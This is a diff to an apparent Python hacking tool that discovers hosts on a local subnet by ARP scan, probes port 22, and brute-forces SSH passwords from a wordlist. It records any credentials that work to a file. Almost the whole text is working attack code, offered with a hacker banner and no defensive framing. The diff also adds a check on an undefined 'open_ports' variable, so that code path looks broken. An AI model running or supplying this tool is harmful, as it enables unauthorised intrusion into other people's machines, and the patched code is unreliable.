@@ -28,20 +28,27 @@ print(f"""
 {stl.MGN}║{stl.RED}  ▀  ▀ .▀  ▀.▀       ▀▀▀ · ▀  ▀  ▀▀▀ ▀▀ █▪ ▀▀▀  {stl.MGN}║ ║{stl.RST}
 {stl.MGN}║{stl.RED}                                         v1.0   {stl.MGN}║ ║{stl.RST}
 {stl.MGN}╚════════════════════════════════════════════════╝{stl.MGN} ║{stl.RST}
-{stl.MGN} ║{stl.RED}    #m0d3ls!           aurora.oops.wtf           {stl.MGN}║{stl.RST}
+{stl.MGN} ║{stl.RED}    #m0d3ls!          aurora.oops.wtf            {stl.MGN}║{stl.RST}
 {stl.MGN} ╚═════════════════════════════════════════════════╝{stl.RST}
 """)
 
 if os.geteuid() != 0:
     sys.exit(f"[{stl.RED}-{stl.RST}] Must run as sudo!")
 
-target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.1.0/24): ") or "192.168.1.0/24"
+target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.0.0/24): ") or "192.168.0.0/24"
 port = int(input(f"[{stl.BLU}*{stl.RST}] Port (22): ") or 22)
 list_file = input(f"[{stl.BLU}*{stl.RST}] Wordlist (funlist): ") or "funlist"
 username = input(f"[{stl.BLU}*{stl.RST}] Username (h4x0r1337): ") or "h4x0r1337"
-wordlist = open(list_file)
+
 login_file = "successful_logins.txt"
-timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+
+funlist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "funlist")
+
+if not os.path.exists(funlist_path):
+    open(funlist_path, "a").close()
+    print(f"[{stl.GRN}*{stl.RST}] Created funlist")
 
 if not os.path.exists(login_file):
     with open(login_file, 'w') as file:
@@ -49,11 +56,10 @@ if not os.path.exists(login_file):
     print(f"[{stl.BLU}*{stl.RST}] Created {login_file}")
 
 def scan(ip):
-    print(f"\n[{stl.BLU}*{stl.RST}] ARP-Haunting {stl.MGN}{target_ip}{stl.RST} as {stl.YLW}{username}{stl.RST} on port {stl.MGN}{port}{stl.RST} started @ {stl.CYN}{timestamp}{stl.RST}")
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     answered_list = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
-    results = [{"ip": e[1].psrc, "mac": e[1].hwsrc} for e in answered_list]
+    results = list(map(lambda e: {"ip": e[1].psrc, "mac": e[1].hwsrc}, answered_list))   
     return results
 
 def check_port(ip, port):
@@ -64,6 +70,7 @@ def check_port(ip, port):
 def attempt_ssh_login(ip, port, username, password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
         ssh.connect(ip, port, username, password, timeout=5)
         tqdm.write(f"[{stl.GRN}*{stl.RST}] Success!\t\t\t {stl.YLW}{username}{stl.RST}:{stl.YLW}{password}{stl.RST} @ {stl.CYN}{timestamp}{stl.RST}")
@@ -82,27 +89,35 @@ def attempt_ssh_login(ip, port, username, password):
 def process_host(ip, mac, position):
     print(f"[{stl.BLU}*{stl.RST}] Found:\t\t\t {stl.MGN}{ip}{stl.RST}\t\t ({mac})")
     if check_port(ip, port):
-        print(f"[{stl.GRN}+{stl.RST}] Open:\t\t\t {stl.GRN}{ip}{stl.RST}:{stl.GRN}{port}{stl.RST} \t attempting login...\n")
-        with open(list_file, 'r') as wordlist:
-            for password in tqdm(wordlist.readlines(), desc=f"Brute-forcing {ip}", unit="pwd", dynamic_ncols=True, colour="red", position=position + 1, leave=False):
-                if attempt_ssh_login(ip, port, username, password.strip()):
-                    break
+        if open_ports:
+            print(f"[{stl.GRN}+{stl.RST}] Open:\t\t\t {stl.GRN}{ip}{stl.RST}:{stl.GRN}{port}{stl.RST} \t attempting login...\n")
+            with open(list_file, 'r') as wordlist:
+                for password in tqdm(wordlist.readlines(), desc=f"Brute-forcing {ip}", unit="pwd", dynamic_ncols=True, colour="red", position=position + 1, leave=False):
+                    if attempt_ssh_login(ip, port, username, password.strip()):
+                        break
 
 def main():
     start_time = time.time()
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
     scan_results = scan(target_ip)
+    print(f"\n[{stl.BLU}*{stl.RST}] ARP-Haunting {stl.MGN}{target_ip}{stl.RST} as {stl.YLW}{username}{stl.RST} on port {stl.MGN}{port}{stl.RST} started @ {stl.CYN}{timestamp}{stl.RST}")
+
     if not scan_results:
         print(f"[{stl.RED}-{stl.RST}] No devices found!")
         return
     print(f"[{stl.BLU}*{stl.RST}] {len(scan_results)} devices detected")
-    
+
     with tqdm(total=len(scan_results), unit="host", colour="green", position=0, leave=False, bar_format="{desc}") as pbar:
         with ThreadPoolExecutor(max_workers=5) as executor:
             futures = {executor.submit(process_host, result["ip"], result["mac"], idx): result for idx, result in enumerate(scan_results)}
             for future in as_completed(futures):
                 pbar.update(1)
-    
-    print(f"[{stl.BLU}*{stl.RST}] Scan completed at\t\t {stl.CYN}{timestamp}{stl.RST}\t Total time: {stl.CYN}{time.time() - start_time:.2f}s{stl.RST}")
+
+    end_time = time.time()
+    duration = end_time - start_time
+    print(f"[{stl.BLU}*{stl.RST}] Scan completed at\t\t {stl.CYN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{stl.RST}\t Total time: {stl.CYN}{duration:.2f}s{stl.RST}")
+
 
 if __name__ == "__main__":
-    main()  
+    main()
